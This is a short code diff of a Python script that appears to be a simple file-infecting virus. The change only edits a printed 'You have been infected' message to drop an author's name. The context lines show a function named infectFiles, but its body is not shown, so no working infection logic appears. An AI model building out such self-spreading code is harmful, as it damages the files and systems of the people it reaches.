@@ -2,7 +2,7 @@
 import datetime
 import os
 import time
-message = "You have been infected By <Yoni Ifrah>"
+message = "You have been infected"
 filename = os.path.basename(__file__)
 
 def infectFiles(folder):
